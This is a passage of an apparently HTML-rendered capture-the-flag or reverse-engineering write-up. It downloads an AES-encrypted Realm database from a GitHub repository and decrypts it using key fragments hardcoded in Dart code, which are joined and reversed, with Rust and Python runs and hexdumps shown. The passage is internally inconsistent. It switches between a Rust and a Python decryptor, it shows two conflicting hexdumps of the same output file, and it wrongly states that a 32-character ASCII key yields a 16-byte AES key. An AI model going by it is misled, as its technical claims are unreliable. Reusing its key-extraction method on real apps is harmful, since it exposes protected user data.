Decryptor\u003C/h2>\n\u003Ch3 id=\"downloading-the-encrypted-file\">Downloading the Encrypted File\u003C/h3>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> curl\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -L\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -o\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> enc.bin\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"https://github.com/chicken-jockeyy/confidentialdb/raw/refs/heads/main/enc.bin\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">  %\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Total\u003C/span>\u003Cspan style=\"color:#9ECBFF\">    %\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Received\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> %\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Xferd\u003C/span>\u003Cspan style=\"color:#9ECBFF\">  Average\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Speed\u003C/span>\u003Cspan style=\"color:#9ECBFF\">   Time\u003C/span>\u003Cspan style=\"color:#9ECBFF\">    Time\u003C/span>\u003Cspan style=\"color:#9ECBFF\">     Time\u003C/span>\u003Cspan style=\"color:#9ECBFF\">  Current\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                                 Dload\u003C/span>\u003Cspan style=\"color:#9ECBFF\">  Upload\u003C/span>\u003Cspan style=\"color:#9ECBFF\">   Total\u003C/span>\u003Cspan style=\"color:#9ECBFF\">   Spent\u003C/span>\u003Cspan style=\"color:#9ECBFF\">    Left\u003C/span>\u003Cspan style=\"color:#9ECBFF\">  Speed\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">100\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 12288k\u003C/span>\u003Cspan style=\"color:#79B8FF\">  100\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 12288k\u003C/span>\u003Cspan style=\"color:#79B8FF\">   0\u003C/span>\u003Cspan style=\"color:#79B8FF\">     0\u003C/span>\u003Cspan style=\"color:#9ECBFF\">  1988k\u003C/span>\u003Cspan style=\"color:#79B8FF\">      0\u003C/span>\u003Cspan style=\"color:#9ECBFF\">   0:00:06\u003C/span>\u003Cspan style=\"color:#9ECBFF\">  0:00:06\u003C/span>\u003Cspan style=\"color:#79B8FF\"> --:--:--\u003C/span>\u003Cspan style=\"color:#9ECBFF\">  3087k\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> ls\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -lh\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> enc.bin\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">-rw-r--r--\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 13M\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Dec\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 30\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 18:50\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> enc.bin\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> file\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> enc.bin\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">enc.bin:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> data\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The file is 12 MB of raw binary data (AES-encrypted).\u003C/p>\n\u003Ch3 id=\"creating-cargotoml-for-rust-dependencies\">Creating Cargo.toml for Rust Dependencies\u003C/h3>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"toml\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">[\u003C/span>\u003Cspan style=\"color:#B392F0\">package\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">name = \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"decrypt_realm\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">version = \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"0.1.0\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">edition = \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"2021\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">[\u003C/span>\u003Cspan style=\"color:#B392F0\">dependencies\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">aes = \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"0.8\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">base64 = \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"0.21\"\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Required crates:\u003C/p>\n\u003Cul>\n\u003Cli>\u003Cstrong>aes\u003C/strong>: Provides AES block cipher implementation\u003C/li>\n\u003Cli>\u003Cstrong>base64\u003C/strong>: Handles Base64 encoding/decoding\u003C/li>\n\u003C/ul>\n\u003Ch3 id=\"running-the-rust-decryptor\">Running the Rust Decryptor\u003C/h3>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> cargo\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> run\u003C/span>\u003Cspan style=\"color:#79B8FF\"> --release\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">   Compiling\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> aes\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> v0.8.3\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">   Compiling\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> base64\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> v0.21.5\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">   Compiling\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> decrypt_realm\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> v0.1.0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    Finished\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> release\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [optimized] target(\u003C/span>\u003Cspan style=\"color:#B392F0\">s\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) in 3.42s\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">     Running\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> `\u003C/span>\u003Cspan style=\"color:#B392F0\">target/release/decrypt_realm\u003C/span>\u003Cspan style=\"color:#9ECBFF\">`\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">Key\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> part\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 1:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 04e0d32be85f3b42\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">Key\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> part\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 2:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 7173047a9d6574e5\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">Combined\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> key:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 04e0d32be85f3b427173047a9d6574e5\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">Reversed\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> key:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 5e4756d9a740371724b3f58eb23d0e40\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">Encrypted\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> data\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> size:\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 12582928\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> bytes\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\"> AES\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> ECB\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> decryption\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> complete\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\"> Base64\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> decoding\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> complete\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">Realm\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> database\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> saved\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> as\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 'decrypted.realm'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\"> File\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> size:\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 9437184\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> bytes\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (9 \u003C/span>\u003Cspan style=\"color:#9ECBFF\">MB\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\"> File\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> appears\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> to\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> be\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> a\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> valid\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Realm\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> database\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch3 id=\"verifying-the-decrypted-file\">Verifying the Decrypted File\u003C/h3>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> ls\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -lh\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> decrypted.realm\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">-rw-r--r--\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 9.0M\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Dec\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 30\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 19:15\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> decrypted.realm\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> file\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> decrypted.realm\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">decrypted.realm:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> data\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> hexdump\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -C\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> decrypted.realm\u003C/span>\u003Cspan style=\"color:#F97583\"> |\u003C/span>\u003Cspan style=\"color:#B392F0\"> head\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -20\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">00000000\u003C/span>\u003Cspan style=\"color:#79B8FF\">  00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\">  00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#F97583\">  |\u003C/span>\u003Cspan style=\"color:#79B8FF\">................\u003C/span>\u003Cspan style=\"color:#F97583\">|\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">*\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">00000020\u003C/span>\u003Cspan style=\"color:#79B8FF\">  54\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 4c\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 44\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 42\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#9ECBFF\">  0f\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 72\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 65\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 61\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 6c\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 6d\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 5f\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 76\u003C/span>\u003Cspan style=\"color:#F97583\">  |\u003C/span>\u003Cspan style=\"color:#B392F0\">TLDB.....realm_v\u003C/span>\u003Cspan style=\"color:#F97583\">|\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">00000030\u003C/span>\u003Cspan style=\"color:#79B8FF\">  65\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 72\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 73\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 69\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 6f\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 6e\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\">  14\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 01\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#F97583\">  |\u003C/span>\u003Cspan style=\"color:#B392F0\">ersion..........\u003C/span>\u003Cspan style=\"color:#F97583\">|\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch3 id=\"why-the-key-is-reversed\">Why the Key is Reversed\u003C/h3>\n\u003Cp>Looking at the Dart code pattern:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"dart\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">String\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> keyPart1 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"04e0d32be85f3b42\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">String\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> keyPart2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"7173047a9d6574e5\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">String\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> combined \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> keyPart1 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> keyPart2;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">String\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> reversed \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> combined.\u003C/span>\u003Cspan style=\"color:#B392F0\">split\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">''\u003C/span>\u003Cspan style=\"color:#E1E4E8\">).reversed.\u003C/span>\u003Cspan style=\"color:#B392F0\">join\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">''\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This reversal serves multiple purposes:\u003C/p>\n\u003Col>\n\u003Cli>\u003Cstrong>Obfuscation\u003C/strong>: Makes static analysis slightly harder\u003C/li>\n\u003Cli>\u003Cstrong>Key Derivation\u003C/strong>: Creates a “derived” key from hardcoded parts\u003C/li>\n\u003Cli>\u003Cstrong>String Manipulation\u003C/strong>: Common pattern in Dart for simple transformations\u003C/li>\n\u003C/ol>\n\u003Cp>The reversed key \u003Ccode>5e4756d9a740371724b3f58eb23d0e40\u003C/code> is exactly 32 ASCII characters, which when encoded as UTF-8 bytes gives us the required 16-byte (128-bit) AES key.\u003C/p>\n\u003Cp>With our Python decryption script complete, we can now decrypt the realm database:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> python3\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> decrypt_realm.py\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">Realm\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> database\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> saved\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> as\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 'decrypted.realm'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">File\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> size:\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 9437184\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> bytes\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Verification of the decrypted file:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> ls\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -lh\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> decrypted.realm\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">-rw-r--r--\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 9.0M\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Dec\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 30\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 19:21\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> decrypted.realm\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> file\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> decrypted.realm\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">decrypted.realm:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> data\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> hexdump\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -C\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> decrypted.realm\u003C/span>\u003Cspan style=\"color:#F97583\"> |\u003C/span>\u003Cspan style=\"color:#B392F0\"> head\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -10\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">00000000\u003C/span>\u003Cspan style=\"color:#79B8FF\">  78\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 96\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 88\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#9ECBFF\">  c8\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 36\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 88\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#F97583\">  |\u003C/span>\u003Cspan style=\"color:#B392F0\">x........6......\u003C/span>\u003Cspan style=\"color:#F97583\">|\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">00000010\u003C/span>\u003Cspan style=\"color:#79B8FF\">  54\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 2d\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 44\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 42\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 09\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 09\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\">  41\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 41\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 41\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 41\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 0e\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 05\u003C/span>\u003Cspan style=\"color:#F97583\">  |\u003C/span>\u003Cspan style=\"color:#B392F0\">T-DB....AAAA....\u003C/span>\u003Cspan style=\"color:#F97583\">|\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">00000020\u003C/span>\u003Cspan style=\"color:#79B8FF\">  70\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 6b\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\">  00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#F97583\">  |\u003C/span>\u003Cspan style=\"color:#B392F0\">pk..............\u003C/span>\u003Cspan style=\"color:#F97583\">|\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">00000030\u003C/span>\u003Cspan style=\"color:#79B8FF\">  00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\">  00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 1d\u003C/span>\u003Cspan style=\"color:#F97583\">  |\u003C/span>\u003Cspan style=\"color:#79B8FF\">................\u003C/span>\u003Cspan style=\"color:#F97583\">|\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">00000040\u003C/span>\u003Cspan style=\"color:#9ECBFF\">  6d\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 65\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 